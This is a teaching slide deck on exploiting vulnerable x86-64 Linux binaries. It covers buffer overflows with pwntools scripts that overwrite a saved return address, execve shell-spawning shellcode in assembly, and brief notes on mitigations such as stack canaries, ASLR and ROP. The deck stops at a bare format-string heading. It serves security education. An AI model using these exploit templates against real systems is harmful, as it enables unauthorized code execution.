---
marp: true
theme: leet
---

# pwn

exploiting (very) vulnerable x86-64 binaries on linux

---

## c bad

- trusts you too much
  - array accesses
  - integer overflows
- mixing data and metadata
  - return addresses on stack
  - null-terminated strings
- manual {init,cleanup}
- poor type system

---

some dangerous library functions:

- `gets`
- `strcpy`
- `scanf`
- `sprintf`
- …

---

![gets deemed dangerou](./media/gets.png)

---

## buffer overflows

---

### stepping out of our lane

- causing crashes
- changing stuff on the stack
- jumping to arbitrary places in the code
  - other functions
  - middle of other functions
- running arbitrary code*

---

### causing crashes

Inputs like `AAAAAAAAAAAAAAAAAAAAAAAAAAAA…`

```py
from pwn import *

p = process("./vuln")
p.sendline(b"A" * 500) # adjust number as necessary
```

---

### changing stuff on the stack

```py
from pwn import *

padding = 64

p = process("./vuln")
p.sendline((b"A" * padding) + p32(0xDEADBEEF))
```

---

### changing (especially useful) stuff on the stack

1. set a breakpoint in the vulnerable function
2. run
3. check the addresses of
   - the vulnerable buffer
   - saved rip (`info frame`)
4. send `(b'A' * padding) + p64(spoof_return_addr)`

---

```py
from pwn import *

saved_rip_addr = 0x7fffffff...
buffer_addr = 0x7fffffff...
padding_size = saved_rip_addr - buffer_addr

spoofed_return_addr = 0x40...

p = process("./pwnable")
p.sendline((b'A' * padding_size) + p64(spoofed_return_addr))
p.interactive()
```

---

### shellcode

compiled bytes (position-independent) that do stuff

examples:

- open a shell
- read a file
- change permissions on a file
- callback shell
- …

considerations: prohibited bytes, …

---

```
mov rax, 59
mov rbx, 0x68732f2f6e69622f
push rbx
mov rdi, rsp
mov rsi, 0
mov rdx, 0
syscall
```

---

### write ⊕ execute

don't execute stack contents as code!

gcc requires you to explicitly disable this (`-z execstack`).

---

### stack canaries

1. insert some secret bytes at the boundaries of buffers
2. before leaving the function, verify that they haven't been overwritten

gcc requires you to explicitly disable this (`-fno-stack-protector`).

---

### aslr

---

### rop

1. make a list of useful gadgets
2. chain gadgets to execute arbitrary-ish assembly
3. ???
4. profit

<!-- also jop -->

---

### format string vulns
